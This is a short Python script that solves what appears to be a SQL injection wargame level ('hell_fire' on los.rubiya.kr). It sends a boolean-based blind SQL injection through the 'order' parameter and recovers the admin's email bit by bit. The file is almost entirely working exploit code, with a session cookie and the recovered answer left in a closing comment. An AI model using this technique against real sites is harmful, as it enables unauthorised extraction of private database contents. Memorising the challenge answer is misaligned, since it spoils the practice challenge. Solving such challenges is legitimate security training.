import requests


def blindi():
	password=""
	cookies={"PHPSESSID":"2jmdje149iheon8es94327lllt"}
	loop_count=28
	for i in range(1,loop_count+1):
		print("progress : " + str(i))
		word=""
		for j in range(1, 9):
			URL="https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php?order=if(id='admin' and substr(lpad(bin(ord(substr(email,"+str(i)+",1))),8,'0'),"+str(j)+",1)=1, 199, 201)"
			response = requests.get(URL, cookies=cookies)
			if "<th>score</th><tr><td>admin</td>" in response.text:
				word+=str(1)
			else:
				word+=str(0)
			print("current word : "+ str(word))

		password+=chr(int(word,2))
		print("current password : " + password)

	print("admin's Password : " + password)
	
if __name__ == "__main__":
	print("Start Program")
	blindi()
	# password : admin_secure_email@emai1.com
